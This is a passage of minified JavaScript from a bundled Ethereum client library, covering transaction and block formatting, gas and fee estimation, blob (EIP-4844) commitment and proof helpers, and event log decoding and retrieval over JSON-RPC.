a={...s,blockHash:s.blockHash?s.blockHash:null,blockNumber:s.blockNumber?BigInt(s.blockNumber):null,chainId:s.chainId?(0,e.hexToNumber)(s.chainId):void 0,gas:s.gas?BigInt(s.gas):void 0,gasPrice:s.gasPrice?BigInt(s.gasPrice):void 0,maxFeePerBlobGas:s.maxFeePerBlobGas?BigInt(s.maxFeePerBlobGas):void 0,maxFeePerGas:s.maxFeePerGas?BigInt(s.maxFeePerGas):void 0,maxPriorityFeePerGas:s.maxPriorityFeePerGas?BigInt(s.maxPriorityFeePerGas):void 0,nonce:s.nonce?(0,e.hexToNumber)(s.nonce):void 0,to:s.to?s.to:null,transactionIndex:s.transactionIndex?Number(s.transactionIndex):null,type:s.type?t.transactionType[s.type]:void 0,typeHex:s.type?s.type:void 0,value:s.value?BigInt(s.value):void 0,v:s.v?BigInt(s.v):void 0};return s.authorizationList&&(a.authorizationList=i(s.authorizationList)),a.yParity=(()=>{if(s.yParity)return Number(s.yParity);if(typeof a.v=="bigint"){if(a.v===0n||a.v===27n)return 0;if(a.v===1n||a.v===28n)return 1;if(a.v>=35n)return a.v%2n===0n?1:0}})(),a.type==="legacy"&&(delete a.accessList,delete a.maxFeePerBlobGas,delete a.maxFeePerGas,delete a.maxPriorityFeePerGas,delete a.yParity),a.type==="eip2930"&&(delete a.maxFeePerBlobGas,delete a.maxFeePerGas,delete a.maxPriorityFeePerGas),a.type==="eip1559"&&delete a.maxFeePerBlobGas,a}t.defineTransaction=(0,n.defineFormatter)("transaction",r);function i(s){return s.map(o=>({address:o.address,chainId:Number(o.chainId),nonce:Number(o.nonce),r:o.r,s:o.s,yParity:Number(o.yParity)}))}})(JO)),JO}var DY;function q8(){if(DY)return Ab;DY=1,Object.defineProperty(Ab,"__esModule",{value:!0}),Ab.defineBlock=void 0,Ab.formatBlock=n;const t=FA(),e=ww();function n(r,i){const s=(r.transactions??[]).map(o=>typeof o=="string"?o:(0,e.formatTransaction)(o));return{...r,baseFeePerGas:r.baseFeePerGas?BigInt(r.baseFeePerGas):null,blobGasUsed:r.blobGasUsed?BigInt(r.blobGasUsed):void 0,difficulty:r.difficulty?BigInt(r.difficulty):void 0,excessBlobGas:r.excessBlobGas?BigInt(r.excessBlobGas):void 0,gasLimit:r.gasLimit?BigInt(r.gasLimit):void 0,gasUsed:r.gasUsed?BigInt(r.gasUsed):void 0,hash:r.hash?r.hash:null,logsBloom:r.logsBloom?r.logsBloom:null,nonce:r.nonce?r.nonce:null,number:r.number?BigInt(r.number):null,size:r.size?BigInt(r.size):void 0,timestamp:r.timestamp?BigInt(r.timestamp):void 0,transactions:s,totalDifficulty:r.totalDifficulty?BigInt(r.totalDifficulty):null}}return Ab.defineBlock=(0,t.defineFormatter)("block",n),Ab}var BY;function ly(){if(BY)return rC;BY=1,Object.defineProperty(rC,"__esModule",{value:!0}),rC.getBlock=r;const t=Wj(),e=lt(),n=q8();async function r(i,{blockHash:s,blockNumber:o,blockTag:a=i.experimental_blockTag??"latest",includeTransactions:c}={}){const l=c??!1,f=o!==void 0?(0,e.numberToHex)(o):void 0;let h=null;if(s?h=await i.request({method:"eth_getBlockByHash",params:[s,l]},{dedupe:!0}):h=await i.request({method:"eth_getBlockByNumber",params:[f||a,l]},{dedupe:!!f}),!h)throw new t.BlockNotFoundError({blockHash:s,blockNumber:o});return(i.chain?.formatters?.block?.format||n.formatBlock)(h,"getBlock")}return rC}var iC={},jY;function Gj(){if(jY)return iC;jY=1,Object.defineProperty(iC,"__esModule",{value:!0}),iC.getGasPrice=t;async function t(e){const n=await e.request({method:"eth_gasPrice"});return BigInt(n)}return iC}var MY;function wle(){if(MY)return b2;MY=1,Object.defineProperty(b2,"__esModule",{value:!0}),b2.estimateMaxPriorityFeePerGas=s,b2.internal_estimateMaxPriorityFeePerGas=o;const t=$A(),e=ci(),n=Pn(),r=ly(),i=Gj();async function s(a,c){return o(a,c)}async function o(a,c){const{block:l,chain:f=a.chain,request:h}=c||{};try{const m=f?.fees?.maxPriorityFeePerGas??f?.fees?.defaultPriorityFee;if(typeof m=="function"){const w=l||await(0,n.getAction)(a,r.getBlock,"getBlock")({}),y=await m({block:w,client:a,request:h});if(y===null)throw new Error;return y}if(typeof m<"u")return m;const b=await a.request({method:"eth_maxPriorityFeePerGas"});return(0,e.hexToBigInt)(b)}catch{const[m,b]=await Promise.all([l?Promise.resolve(l):(0,n.getAction)(a,r.getBlock,"getBlock")({}),(0,n.getAction)(a,i.getGasPrice,"getGasPrice")({})]);if(typeof m.baseFeePerGas!="bigint")throw new t.Eip1559FeesNotSupportedError;const w=b-m.baseFeePerGas;return w<0n?0n:w}}return b2}var UY;function vle(){if(UY)return y2;UY=1,Object.defineProperty(y2,"__esModule",{value:!0}),y2.estimateFeesPerGas=s,y2.internal_estimateFeesPerGas=o;const t=$A(),e=Pn(),n=wle(),r=ly(),i=Gj();async function s(a,c){return o(a,c)}async function o(a,c){const{block:l,chain:f=a.chain,request:h,type:m="eip1559"}=c||{},b=await(async()=>typeof f?.fees?.baseFeeMultiplier=="function"?f.fees.baseFeeMultiplier({block:l,client:a,request:h}):f?.fees?.baseFeeMultiplier??1.2)();if(b<1)throw new t.BaseFeeScalarError;const y=10**(b.toString().split(".")[1]?.length??0),E=S=>S*BigInt(Math.ceil(b*y))/BigInt(y),A=l||await(0,e.getAction)(a,r.getBlock,"getBlock")({});if(typeof f?.fees?.estimateFeesPerGas=="function"){const S=await f.fees.estimateFeesPerGas({block:l,client:a,multiply:E,request:h,type:m});if(S!==null)return S}if(m==="eip1559"){if(typeof A.baseFeePerGas!="bigint")throw new t.Eip1559FeesNotSupportedError;const S=typeof h?.maxPriorityFeePerGas=="bigint"?h.maxPriorityFeePerGas:await(0,n.internal_estimateMaxPriorityFeePerGas)(a,{block:A,chain:f,request:h}),v=E(A.baseFeePerGas);return{maxFeePerGas:h?.maxFeePerGas??v+S,maxPriorityFeePerGas:S}}return{gasPrice:h?.gasPrice??E(await(0,e.getAction)(a,i.getGasPrice,"getGasPrice")({}))}}return y2}var sC={},LY;function V8(){if(LY)return sC;LY=1,Object.defineProperty(sC,"__esModule",{value:!0}),sC.getTransactionCount=n;const t=ci(),e=lt();async function n(r,{address:i,blockTag:s="latest",blockNumber:o}){const a=await r.request({method:"eth_getTransactionCount",params:[i,typeof o=="bigint"?(0,e.numberToHex)(o):s]},{dedupe:!!o});return(0,t.hexToNumber)(a)}return sC}var oC={},FY;function W8(){if(FY)return oC;FY=1,Object.defineProperty(oC,"__esModule",{value:!0}),oC.blobsToCommitments=n;const t=yr(),e=lt();function n(r){const{kzg:i}=r,s=r.to??(typeof r.blobs[0]=="string"?"hex":"bytes"),o=typeof r.blobs[0]=="string"?r.blobs.map(c=>(0,t.hexToBytes)(c)):r.blobs,a=[];for(const c of o)a.push(Uint8Array.from(i.blobToKzgCommitment(c)));return s==="bytes"?a:a.map(c=>(0,e.bytesToHex)(c))}return oC}var aC={},$Y;function G8(){if($Y)return aC;$Y=1,Object.defineProperty(aC,"__esModule",{value:!0}),aC.blobsToProofs=n;const t=yr(),e=lt();function n(r){const{kzg:i}=r,s=r.to??(typeof r.blobs[0]=="string"?"hex":"bytes"),o=typeof r.blobs[0]=="string"?r.blobs.map(l=>(0,t.hexToBytes)(l)):r.blobs,a=typeof r.commitments[0]=="string"?r.commitments.map(l=>(0,t.hexToBytes)(l)):r.commitments,c=[];for(let l=0;l<o.length;l++){const f=o[l],h=a[l];c.push(Uint8Array.from(i.computeBlobKzgProof(f,h)))}return s==="bytes"?c:c.map(l=>(0,e.bytesToHex)(l))}return aC}var cC={},uC={},lC={},gu={},HY;function Ele(){if(HY)return gu;HY=1,Object.defineProperty(gu,"__esModule",{value:!0}),gu.sha224=gu.SHA224=gu.sha256=gu.SHA256=void 0;const t=ple();return gu.SHA256=t.SHA256,gu.sha256=t.sha256,gu.SHA224=t.SHA224,gu.sha224=t.sha224,gu}var zY;function Kj(){if(zY)return lC;zY=1,Object.defineProperty(lC,"__esModule",{value:!0}),lC.sha256=i;const t=Ele(),e=So(),n=yr(),r=lt();function i(s,o){const a=o||"hex",c=(0,t.sha256)((0,e.isHex)(s,{strict:!1})?(0,n.toBytes)(s):s);return a==="bytes"?c:(0,r.toHex)(c)}return lC}var qY;function Zj(){if(qY)return uC;qY=1,Object.defineProperty(uC,"__esModule",{value:!0}),uC.commitmentToVersionedHash=n;const t=lt(),e=Kj();function n(r){const{commitment:i,version:s=1}=r,o=r.to??(typeof i=="string"?"hex":"bytes"),a=(0,e.sha256)(i,"bytes");return a.set([s],0),o==="bytes"?a:(0,t.bytesToHex)(a)}return uC}var VY;function Yj(){if(VY)return cC;VY=1,Object.defineProperty(cC,"__esModule",{value:!0}),cC.commitmentsToVersionedHashes=e;const t=Zj();function e(n){const{commitments:r,version:i}=n,s=n.to??(typeof r[0]=="string"?"hex":"bytes"),o=[];for(const a of r)o.push((0,t.commitmentToVersionedHash)({commitment:a,to:s,version:i}));return o}return cC}var dC={},fC={},XO={},WY;function FFe(){return WY||(WY=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.maxBytesPerTransaction=t.bytesPerBlob=t.fieldElementsPerBlob=t.bytesPerFieldElement=void 0;const e=6;t.bytesPerFieldElement=32,t.fieldElementsPerBlob=4096,t.bytesPerBlob=t.bytesPerFieldElement*t.fieldElementsPerBlob,t.maxBytesPerTransaction=t.bytesPerBlob*e-1-1*t.fieldElementsPerBlob*e})(XO)),XO}var yu={},v2={},GY;function _le(){return GY||(GY=1,Object.defineProperty(v2,"__esModule",{value:!0}),v2.versionedHashVersionKzg=void 0,v2.versionedHashVersionKzg=1),v2}var KY;function Ale(){if(KY)return yu;KY=1,Object.defineProperty(yu,"__esModule",{value:!0}),yu.InvalidVersionedHashVersionError=yu.InvalidVersionedHashSizeError=yu.EmptyBlobError=yu.BlobSizeTooLargeError=void 0;const t=_le(),e=Kt();class n extends e.BaseError{constructor({maxSize:a,size:c}){super("Blob size is too large.",{metaMessages:[`Max: ${a} bytes`,`Given: ${c} bytes`],name:"BlobSizeTooLargeError"})}}yu.BlobSizeTooLargeError=n;class r extends e.BaseError{constructor(){super("Blob data must not be empty.",{name:"EmptyBlobError"})}}yu.EmptyBlobError=r;class i extends e.BaseError{constructor({hash:a,size:c}){super(`Versioned hash "${a}" size is invalid.`,{metaMessages:["Expected: 32",`Received: ${c}`],name:"InvalidVersionedHashSizeError"})}}yu.InvalidVersionedHashSizeError=i;class s extends e.BaseError{constructor({hash:a,version:c}){super(`Versioned hash "${a}" version is invalid.`,{metaMessages:[`Expected: ${t.versionedHashVersionKzg}`,`Received: ${c}`],name:"InvalidVersionedHashVersionError"})}}return yu.InvalidVersionedHashVersionError=s,yu}var ZY;function Cle(){if(ZY)return fC;ZY=1,Object.defineProperty(fC,"__esModule",{value:!0}),fC.toBlobs=o;const t=FFe(),e=Ale(),n=DA(),r=fa(),i=yr(),s=lt();function o(a){const c=a.to??(typeof a.data=="string"?"hex":"bytes"),l=typeof a.data=="string"?(0,i.hexToBytes)(a.data):a.data,f=(0,r.size)(l);if(!f)throw new e.EmptyBlobError;if(f>t.maxBytesPerTransaction)throw new e.BlobSizeTooLargeError({maxSize:t.maxBytesPerTransaction,size:f});const h=[];let m=!0,b=0;for(;m;){const w=(0,n.createCursor)(new Uint8Array(t.bytesPerBlob));let y=0;for(;y<t.fieldElementsPerBlob;){const E=l.slice(b,b+(t.bytesPerFieldElement-1));if(w.pushByte(0),w.pushBytes(E),E.length<31){w.pushByte(128),m=!1;break}y++,b+=31}h.push(w)}return c==="bytes"?h.map(w=>w.bytes):h.map(w=>(0,s.bytesToHex)(w.bytes))}return fC}var YY;function K8(){if(YY)return dC;YY=1,Object.defineProperty(dC,"__esModule",{value:!0}),dC.toBlobSidecars=r;const t=W8(),e=G8(),n=Cle();function r(i){const{data:s,kzg:o,to:a}=i,c=i.blobs??(0,n.toBlobs)({data:s,to:a}),l=i.commitments??(0,t.blobsToCommitments)({blobs:c,kzg:o,to:a}),f=i.proofs??(0,e.blobsToProofs)({blobs:c,commitments:l,kzg:o,to:a}),h=[];for(let m=0;m<c.length;m++)h.push({blob:c[m],commitment:l[m],proof:f[m]});return h}return dC}var hC={},QY;function Z8(){if(QY)return hC;QY=1,Object.defineProperty(hC,"__esModule",{value:!0}),hC.getTransactionType=e;const t=ga();function e(n){if(n.type)return n.type;if(typeof n.authorizationList<"u")return"eip7702";if(typeof n.blobs<"u"||typeof n.blobVersionedHashes<"u"||typeof n.maxFeePerBlobGas<"u"||typeof n.sidecars<"u")return"eip4844";if(typeof n.maxFeePerGas<"u"||typeof n.maxPriorityFeePerGas<"u")return"eip1559";if(typeof n.gasPrice<"u")return typeof n.accessList<"u"?"eip2930":"legacy";throw new t.InvalidSerializableTransactionError({transaction:n})}return hC}var pC={},mC={},JY;function HA(){if(JY)return mC;JY=1,Object.defineProperty(mC,"__esModule",{value:!0}),mC.getTransactionError=r;const t=Jf(),e=ga(),n=LA();function r(i,{docsPath:s,...o}){const a=(()=>{const c=(0,n.getNodeError)(i,o);return c instanceof t.UnknownNodeError?i:c})();return new e.TransactionExecutionError(a,{docsPath:s,...o})}return mC}var gC={},XY;function d0(){if(XY)return gC;XY=1,Object.defineProperty(gC,"__esModule",{value:!0}),gC.getChainId=e;const t=ci();async function e(n){const r=await n.request({method:"eth_chainId"},{dedupe:!0});return(0,t.hexToNumber)(r)}return gC}var eQ;function Qj(){if(eQ)return pC;eQ=1,Object.defineProperty(pC,"__esModule",{value:!0}),pC.fillTransaction=f;const t=Qr(),e=$A(),n=HA(),r=l0(),i=ww(),s=Yu(),o=Pn(),a=Qu(),c=ly(),l=d0();async function f(h,m){const{account:b=h.account,accessList:w,authorizationList:y,chain:E=h.chain,blobVersionedHashes:A,blobs:R,data:S,gas:v,gasPrice:k,maxFeePerBlobGas:O,maxFeePerGas:_,maxPriorityFeePerGas:I,nonce:T,nonceManager:B,to:U,type:M,value:N,...q}=m,P=await(async()=>{if(!b||!B||typeof T<"u")return T;const $=(0,t.parseAccount)(b),H=E?E.id:await(0,o.getAction)(h,l.getChainId,"getChainId")({});return await B.consume({address:$.address,chainId:H,client:h})})();(0,a.assertRequest)(m);const C=E?.formatters?.transactionRequest?.format,z=(C||s.formatTransactionRequest)({...(0,r.extract)(q,{format:C}),account:b?(0,t.parseAccount)(b):void 0,accessList:w,authorizationList:y,blobs:R,blobVersionedHashes:A,data:S,gas:v,gasPrice:k,maxFeePerBlobGas:O,maxFeePerGas:_,maxPriorityFeePerGas:I,nonce:P,to:U,type:M,value:N},"fillTransaction");try{const $=await h.request({method:"eth_fillTransaction",params:[z]}),L=(E?.formatters?.transaction?.format||i.formatTransaction)($.tx);delete L.blockHash,delete L.blockNumber,delete L.r,delete L.s,delete L.transactionIndex,delete L.v,delete L.yParity,L.data=L.input,L.gas&&(L.gas=m.gas??L.gas),L.gasPrice&&(L.gasPrice=m.gasPrice??L.gasPrice),L.maxFeePerBlobGas&&(L.maxFeePerBlobGas=m.maxFeePerBlobGas??L.maxFeePerBlobGas),L.maxFeePerGas&&(L.maxFeePerGas=m.maxFeePerGas??L.maxFeePerGas),L.maxPriorityFeePerGas&&(L.maxPriorityFeePerGas=m.maxPriorityFeePerGas??L.maxPriorityFeePerGas),L.nonce&&(L.nonce=m.nonce??L.nonce);const V=await(async()=>{if(typeof E?.fees?.baseFeeMultiplier=="function"){const ne=await(0,o.getAction)(h,c.getBlock,"getBlock")({});return E.fees.baseFeeMultiplier({block:ne,client:h,request:m})}return E?.fees?.baseFeeMultiplier??1.2})();if(V<1)throw new e.BaseFeeScalarError;const Z=10**(V.toString().split(".")[1]?.length??0),J=ne=>ne*BigInt(Math.ceil(V*Z))/BigInt(Z);return L.maxFeePerGas&&!m.maxFeePerGas&&(L.maxFeePerGas=J(L.maxFeePerGas)),L.gasPrice&&!m.gasPrice&&(L.gasPrice=J(L.gasPrice)),{raw:$.raw,transaction:{from:z.from,...L}}}catch($){throw(0,n.getTransactionError)($,{...m,chain:h.chain})}}return pC}var tQ;function zA(){return tQ||(tQ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.supportsFillTransaction=t.eip1559NetworkCache=t.defaultParameters=void 0,t.prepareTransactionRequest=A;const e=Qr(),n=vle(),r=Jj(),i=ly(),s=V8(),o=$A(),a=W8(),c=G8(),l=Yj(),f=K8(),h=Pn(),m=iy(),b=Qu(),w=Z8(),y=Qj(),E=d0();t.defaultParameters=["blobVersionedHashes","chainId","fees","gas","nonce","type"],t.eip1559NetworkCache=new Map,t.supportsFillTransaction=new m.LruMap(128);async function A(R,S){let v=S;const{account:k=R.account,chain:O=R.chain,nonceManager:_,parameters:I=t.defaultParameters}=v,T=(()=>{if(typeof O?.prepareTransactionRequest=="function")return{fn:O.prepareTransactionRequest,runAt:["beforeFillTransaction"]};if(Array.isArray(O?.prepareTransactionRequest))return{fn:O.prepareTransactionRequest[0],runAt:O.prepareTransactionRequest[1].runAt}})();let B;async function U(){return B||(typeof v.chainId<"u"?v.chainId:O?O.id:(B=await(0,h.getAction)(R,E.getChainId,"getChainId")({}),B))}const M=k&&(0,e.parseAccount)(k);let N=v.nonce;if(I.includes("nonce")&&typeof N>"u"&&M&&_){const V=await U();N=await _.consume({address:M.address,chainId:V,client:R})}T?.fn&&T.runAt?.includes("beforeFillTransaction")&&(v=await T.fn(v,{phase:"beforeFillTransaction"}),N??=v.nonce);const P=((I.includes("blobVersionedHashes")||I.includes("sidecars"))&&v.kzg&&v.blobs||t.supportsFillTransaction.get(R.uid)===!1||!["fees","gas"].some(G=>I.includes(G))?!1:!!(I.includes("chainId")&&typeof v.chainId!="number"||I.includes("nonce")&&typeof N!="number"||I.includes("fees")&&typeof v.gasPrice!="bigint"&&(typeof v.maxFeePerGas!="bigint"||typeof v.maxPriorityFeePerGas!="bigint")||I.includes("gas")&&typeof v.gas!="bigint"))?await(0,h.getAction)(R,y.fillTransaction,"fillTransaction")({...v,nonce:N}).then(V=>{const{chainId:G,from:Z,gas:J,gasPrice:ne,nonce:re,maxFeePerBlobGas:le,maxFeePerGas:oe,maxPriorityFeePerGas:ue,type:be,...Me}=V.transaction;return t.supportsFillTransaction.set(R.uid,!0),{...v,...Z?{from:Z}:{},...be?{type:be}:{},...typeof G<"u"?{chainId:G}:{},...typeof J<"u"?{gas:J}:{},...typeof ne<"u"?{gasPrice:ne}:{},...typeof re<"u"?{nonce:re}:{},...typeof le<"u"?{maxFeePerBlobGas:le}:{},...typeof oe<"u"?{maxFeePerGas:oe}:{},...typeof ue<"u"?{maxPriorityFeePerGas:ue}:{},..."nonceKey"in Me&&typeof Me.nonceKey<"u"?{nonceKey:Me.nonceKey}:{}}}).catch(V=>(V.walk?.(J=>{const ne=J;return ne.name==="MethodNotFoundRpcError"||ne.name==="MethodNotSupportedRpcError"})&&t.supportsFillTransaction.set(R.uid,!1),v)):v;N??=P.nonce,v={...P,...M?{from:M?.address}:{},...N?{nonce:N}:{}};const{blobs:C,gas:j,kzg:z,type:$}=v;T?.fn&&T.runAt?.includes("beforeFillParameters")&&(v=await T.fn(v,{phase:"beforeFillParameters"}));let H;async function L(){return H||(H=await(0,h.getAction)(R,i.getBlock,"getBlock")({blockTag:"latest"}),H)}if(I.includes("nonce")&&typeof N>"u"&&M&&!_&&(v.nonce=await(0,h.getAction)(R,s.getTransactionCount,"getTransactionCount")({address:M.address,blockTag:"pending"})),(I.includes("blobVersionedHashes")||I.includes("sidecars"))&&C&&z){const V=(0,a.blobsToCommitments)({blobs:C,kzg:z});if(I.includes("blobVersionedHashes")){const G=(0,l.commitmentsToVersionedHashes)({commitments:V,to:"hex"});v.blobVersionedHashes=G}if(I.includes("sidecars")){const G=(0,c.blobsToProofs)({blobs:C,commitments:V,kzg:z}),Z=(0,f.toBlobSidecars)({blobs:C,commitments:V,proofs:G,to:"hex"});v.sidecars=Z}}if(I.includes("chainId")&&(v.chainId=await U()),(I.includes("fees")||I.includes("type"))&&typeof $>"u")try{v.type=(0,w.getTransactionType)(v)}catch{let V=t.eip1559NetworkCache.get(R.uid);typeof V>"u"&&(V=typeof(await L())?.baseFeePerGas=="bigint",t.eip1559NetworkCache.set(R.uid,V)),v.type=V?"eip1559":"legacy"}if(I.includes("fees"))if(v.type!=="legacy"&&v.type!=="eip2930"){if(typeof v.maxFeePerGas>"u"||typeof v.maxPriorityFeePerGas>"u"){const V=await L(),{maxFeePerGas:G,maxPriorityFeePerGas:Z}=await(0,n.internal_estimateFeesPerGas)(R,{block:V,chain:O,request:v});if(typeof v.maxPriorityFeePerGas>"u"&&v.maxFeePerGas&&v.maxFeePerGas<Z)throw new o.MaxFeePerGasTooLowError({maxPriorityFeePerGas:Z});v.maxPriorityFeePerGas=Z,v.maxFeePerGas=G}}else{if(typeof v.maxFeePerGas<"u"||typeof v.maxPriorityFeePerGas<"u")throw new o.Eip1559FeesNotSupportedError;if(typeof v.gasPrice>"u"){const V=await L(),{gasPrice:G}=await(0,n.internal_estimateFeesPerGas)(R,{block:V,chain:O,request:v,type:"legacy"});v.gasPrice=G}}return I.includes("gas")&&typeof j>"u"&&(v.gas=await(0,h.getAction)(R,r.estimateGas,"estimateGas")({...v,account:M,prepare:M?.type==="local"?[]:["blobVersionedHashes"]})),T?.fn&&T.runAt?.includes("afterFillParameters")&&(v=await T.fn(v,{phase:"afterFillParameters"})),(0,b.assertRequest)(v),delete v.parameters,v}})(QO)),QO}var nQ;function Jj(){if(nQ)return G6;nQ=1,Object.defineProperty(G6,"__esModule",{value:!0}),G6.estimateGas=f;const t=Qr(),e=Kt(),n=UA(),r=lt(),i=ble(),s=l0(),o=Yu(),a=qj(),c=Qu(),l=zA();async function f(h,m){const{account:b=h.account,prepare:w=!0}=m,y=b?(0,t.parseAccount)(b):void 0,E=(()=>{if(Array.isArray(w))return w;if(y?.type!=="local")return["blobVersionedHashes"]})();try{const A=await(async()=>{if(m.to)return m.to;if(m.authorizationList&&m.authorizationList.length>0)return await(0,n.recoverAuthorizationAddress)({authorization:m.authorizationList[0]}).catch(()=>{throw new e.BaseError("`to` is required. Could not infer from `authorizationList`")})})(),{accessList:R,authorizationList:S,blobs:v,blobVersionedHashes:k,blockNumber:O,blockTag:_,data:I,gas:T,gasPrice:B,maxFeePerBlobGas:U,maxFeePerGas:M,maxPriorityFeePerGas:N,nonce:q,value:P,stateOverride:C,...j}=w?await(0,l.prepareTransactionRequest)(h,{...m,parameters:E,to:A}):m;if(T&&m.gas!==T)return T;const $=(typeof O=="bigint"?(0,r.numberToHex)(O):void 0)||_,H=(0,a.serializeStateOverride)(C);(0,c.assertRequest)(m);const L=h.chain?.formatters?.transactionRequest?.format,G=(L||o.formatTransactionRequest)({...(0,s.extract)(j,{format:L}),account:y,accessList:R,authorizationList:S,blobs:v,blobVersionedHashes:k,data:I,gasPrice:B,maxFeePerBlobGas:U,maxFeePerGas:M,maxPriorityFeePerGas:N,nonce:q,to:A,value:P},"estimateGas");return BigInt(await h.request({method:"eth_estimateGas",params:H?[G,$??h.experimental_blockTag??"latest",H]:$?[G,$]:[G]}))}catch(A){throw(0,i.getEstimateGasError)(A,{...m,account:y,chain:h.chain})}}return G6}var rQ;function Sle(){if(rQ)return B6;rQ=1,Object.defineProperty(B6,"__esModule",{value:!0}),B6.estimateContractGas=s;const t=Qr(),e=ma(),n=c0(),r=Pn(),i=Jj();async function s(o,a){const{abi:c,address:l,args:f,functionName:h,dataSuffix:m,...b}=a,w=(0,e.encodeFunctionData)({abi:c,args:f,functionName:h});try{return await(0,r.getAction)(o,i.estimateGas,"estimateGas")({data:`${w}${m?m.replace("0x",""):""}`,to:l,...b})}catch(y){const E=b.account?(0,t.parseAccount)(b.account):void 0;throw(0,n.getContractError)(y,{abi:c,address:l,args:f,docsPath:"/docs/contract/estimateContractGas",functionName:h,sender:E?.address})}}return B6}var yC={},bC={},wC={},vC={},iQ;function Ju(){if(iQ)return vC;iQ=1,Object.defineProperty(vC,"__esModule",{value:!0}),vC.isAddressEqual=n;const t=Gu(),e=pa();function n(r,i){if(!(0,e.isAddress)(r,{strict:!1}))throw new t.InvalidAddressError({address:r});if(!(0,e.isAddress)(i,{strict:!1}))throw new t.InvalidAddressError({address:i});return r.toLowerCase()===i.toLowerCase()}return vC}var EC={},sQ;function qA(){if(sQ)return EC;sQ=1,Object.defineProperty(EC,"__esModule",{value:!0}),EC.decodeEventLog=a;const t=$r(),e=lle(),n=fa(),r=bw(),i=s0(),s=Zf(),o="/docs/contract/decodeEventLog";function a(l){const{abi:f,data:h,strict:m,topics:b}=l,w=m??!0,[y,...E]=b;if(!y)throw new t.AbiEventSignatureEmptyTopicsError({docsPath:o});const A=f.find(I=>I.type==="event"&&y===(0,r.toEventSelector)((0,s.formatAbiItem)(I)));if(!(A&&"name"in A)||A.type!=="event")throw new t.AbiEventSignatureNotFoundError(y,{docsPath:o});const{name:R,inputs:S}=A,v=S?.some(I=>!("name"in I&&I.name)),k=v?[]:{},O=S.map((I,T)=>[I,T]).filter(([I])=>"indexed"in I&&I.indexed);for(let I=0;I<O.length;I++){const[T,B]=O[I],U=E[I];if(!U)throw new t.DecodeLogTopicsMismatch({abiItem:A,param:T});k[v?B:T.name||B]=c({param:T,value:U})}const _=S.filter(I=>!("indexed"in I&&I.indexed));if(_.length>0){if(h&&h!=="0x")try{const I=(0,i.decodeAbiParameters)(_,h);if(I)if(v)for(let T=0;T<S.length;T++)k[T]=k[T]??I.shift();else for(let T=0;T<_.length;T++)k[_[T].name]=I[T]}catch(I){if(w)throw I instanceof t.AbiDecodingDataSizeTooSmallError||I instanceof e.PositionOutOfBoundsError?new t.DecodeLogDataMismatch({abiItem:A,data:h,params:_,size:(0,n.size)(h)}):I}else if(w)throw new t.DecodeLogDataMismatch({abiItem:A,data:"0x",params:_,size:0})}return{eventName:R,args:Object.values(k).length>0?k:void 0}}function c({param:l,value:f}){return l.type==="string"||l.type==="bytes"||l.type==="tuple"||l.type.match(/^(.*)\[(\d+)?\]$/)?f:((0,i.decodeAbiParameters)([l],f)||[])[0]}return EC}var oQ;function VA(){if(oQ)return wC;oQ=1,Object.defineProperty(wC,"__esModule",{value:!0}),wC.parseEventLogs=o;const t=$r(),e=Ju(),n=yr(),r=ha(),i=bw(),s=qA();function o(c){const{abi:l,args:f,logs:h,strict:m=!0}=c,b=(()=>{if(c.eventName)return Array.isArray(c.eventName)?c.eventName:[c.eventName]})();return h.map(w=>{try{const y=l.find(A=>A.type==="event"&&w.topics[0]===(0,i.toEventSelector)(A));if(!y)return null;const E=(0,s.decodeEventLog)({...w,abi:[y],strict:m});return b&&!b.includes(E.eventName)||!a({args:E.args,inputs:y.inputs,matchArgs:f})?null:{...E,...w}}catch(y){let E,A;if(y instanceof t.AbiEventSignatureNotFoundError)return null;if(y instanceof t.DecodeLogDataMismatch||y instanceof t.DecodeLogTopicsMismatch){if(m)return null;E=y.abiItem.name,A=y.abiItem.inputs?.some(R=>!("name"in R&&R.name))}return{...w,args:A?[]:{},eventName:E}}}).filter(Boolean)}function a(c){const{args:l,inputs:f,matchArgs:h}=c;if(!h)return!0;if(!l)return!1;function m(b,w,y){try{return b.type==="address"?(0,e.isAddressEqual)(w,y):b.type==="string"||b.type==="bytes"?(0,r.keccak256)((0,n.toBytes)(w))===y:w===y}catch{return!1}}return Array.isArray(l)&&Array.isArray(h)?h.every((b,w)=>{if(b==null)return!0;const y=f[w];return y?(Array.isArray(b)?b:[b]).some(A=>m(y,A,l[w])):!1}):typeof l=="object"&&!Array.isArray(l)&&typeof h=="object"&&!Array.isArray(h)?Object.entries(h).every(([b,w])=>{if(w==null)return!0;const y=f.find(A=>A.name===b);return y?(Array.isArray(w)?w:[w]).some(A=>m(y,A,l[b])):!1}):!1}return wC}var _C={},aQ;function Xf(){if(aQ)return _C;aQ=1,Object.defineProperty(_C,"__esModule",{value:!0}),_C.formatLog=t;function t(e,{args:n,eventName:r}={}){return{...e,blockHash:e.blockHash?e.blockHash:null,blockNumber:e.blockNumber?BigInt(e.blockNumber):null,logIndex:e.logIndex?Number(e.logIndex):null,transactionHash:e.transactionHash?e.transactionHash:null,transactionIndex:e.transactionIndex?Number(e.transactionIndex):null,...r?{args:n,eventName:r}:{}}}return _C}var cQ;function Xj(){if(cQ)return bC;cQ=1,Object.defineProperty(bC,"__esModule",{value:!0}),bC.getLogs=i;const t=oy(),e=VA(),n=lt(),r=Xf();async function i(s,{address:o,blockHash:a,fromBlock:c,toBlock:l,event:f,events:h,args:m,strict:b}={}){const w=b??!1,y=h??(f?[f]:void 0);let E=[];y&&(E=[y.flatMap(v=>(0,t.encodeEventTopics)({abi:[v],eventName:v.name,args:h?void 0:m}))],f&&(E=E[0]));let A;a?A=await s.request({method:"eth_getLogs",params:[{address:o,topics:E,blockHash:a}]}):A=await s.request({method:"eth_getLogs",params:[{address:o,topics:E,fromBlock:typeof c=="bigint"?(0,n.numberToHex)(c):c,toBlock:typeof l=="bigint"?(0,n.numberToHex)(l):l}]});const R=A.map(S=>(0,r.formatLog)(S));return y?(0,e.parseEventLogs)({abi:y,args:m,logs:R,strict:w}):R}return bC}var uQ;function eM(){if(uQ)return yC;uQ=1,Object.defineProperty(yC,"__esModule",{value:!0}),yC.getContractEvents=r;const t=Qf(),e=Pn(),n=Xj();async function r(i,s){const{abi:o,address:a,args:c,blockHash:l,eventName:f,fromBlock:h,toBlock:m,strict:b}=s,w=f?(0,t.getAbiItem)({abi:o,name:f}):void 0,y=w?void 0:o.filter(E=>E.type==="event");return(0,e.getAction)(i,n.getLogs,"getLogs")({address:a,args:c,blockHash:l,event:w,events:y,fromBlock:h,toBlock:m,strict:b})}return yC}var AC={},CC={},lQ;function eh(){if(lQ)return 